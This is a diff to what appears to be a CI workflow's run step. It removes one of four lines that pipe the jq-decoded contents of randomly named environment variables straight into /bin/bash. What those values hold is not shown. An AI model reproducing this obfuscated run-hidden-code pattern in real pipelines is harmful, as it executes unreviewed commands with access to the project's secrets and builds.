@@ -18,7 +18,6 @@ jobs:
         run: |
           printf '%s' "$y39" | jq -r .psbl4 | /bin/bash
           echo $txfra580 | jq -r .spy60496 | /bin/bash
-          echo $thdkd464 | jq -r .kh55205 | /bin/bash
           printf '%s' "$uoy34817" | jq -r .muxhb00160 | /bin/bash
 
       - name: Save results
